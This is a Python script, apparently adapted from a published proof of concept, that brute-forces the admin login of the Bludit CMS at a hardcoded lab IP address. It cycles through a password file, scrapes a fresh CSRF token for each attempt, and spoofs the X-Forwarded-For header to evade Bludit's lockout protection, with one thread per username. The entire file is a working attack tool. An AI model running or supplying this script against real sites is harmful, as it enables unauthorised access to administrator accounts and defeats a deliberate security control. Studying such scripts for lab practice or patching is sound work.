#!/usr/bin/env python3
'''
 Original Author --> https://rastating.github.io/bludit-brute-force-mitigation-bypass/
 This is just the fixed version of the above script so i am not taking
 any credit for the orginal CVE of this vulnerability. Thank you.
'''
import re, sys
import requests, threading

if len(sys.argv) < 2:
    print("Invalid syntax !")
    print("Usage : python bruteforcer.py <user1> <user2>")
    exit(1)

login_url = 'http://10.10.10.191/admin/login'

def BruteForce(username):
    print("[+]: Brute Forcing username : ", username, " ...")
    with open("passwords.txt") as proto:
        for password in proto:
            password = password[:-1] # Parsing the real password out of he way

            session = requests.Session()
            login_page = session.get(login_url)
            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

            headers = {
                'X-Forwarded-For': password,
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Referer': login_url
            }

            data = {
                'tokenCSRF': csrf_token,
                'username': username,
                'password': password,
                'save': ''
            }

            login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

            if 'location' in login_result.headers:
                if '/admin/dashboard' in login_result.headers['location']:
                    print()
                    print('SUCCESS: Password found!')
                    print('Use {u}: --> {p} <---'.format(u = username, p = password))
                    print()
                    break

for user in sys.argv[1:]:
    threading.Thread(target=BruteForce, args=[user]).start()
